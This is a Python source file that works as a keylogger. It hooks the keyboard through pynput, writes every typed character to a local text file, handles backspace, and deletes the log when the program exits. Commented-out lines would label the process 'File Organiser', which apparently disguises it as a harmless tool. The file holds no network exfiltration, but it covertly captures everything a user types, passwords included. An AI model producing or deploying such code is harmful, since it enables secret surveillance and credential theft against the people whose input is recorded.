from datetime import datetime
from pynput import keyboard
import os
import atexit
import pywintypes
from win10toast import ToastNotifier


# toast = ToastNotifier()
# toast.show_toast("File Organiser" , "The process has been started" , duration=30)

# 
# os.chdir("C:\")

is_first_run = True

def on_press(key):
    global is_first_run
    try:
        key_char = key.char
        if key_char == ' ':
            write_to_file(" ")
        elif len(key_char) == 1:
            write_to_file(key_char)
    except AttributeError:
        key_char = str(key)
        if key_char == 'Key.space':
            write_to_file(" ")
        elif key_char == 'Key.backspace':
            delete_last_character()

def write_to_file(character):
    with open("typed_text.txt", "a") as file:
        file.write(character)

def delete_last_character():
    try:
        with open("typed_text.txt", "r") as file:
            text = file.read()
        new_text = text[:-1]
        with open("typed_text.txt", "w") as file:
            file.write(new_text)
    except FileNotFoundError:
        print("File 'typed_text.txt' tidak ditemukan.")

def delete_text_file():
    try:
        os.remove("typed_text.txt")
    except FileNotFoundError:
        pass

def check_and_create_file():
    if not os.path.exists("typed_text.txt"):
        with open("typed_text.txt", "w") as file:
            pass  

check_and_create_file()

with keyboard.Listener(on_press=on_press) as listener:
    atexit.register(delete_text_file)
    listener.join()

    
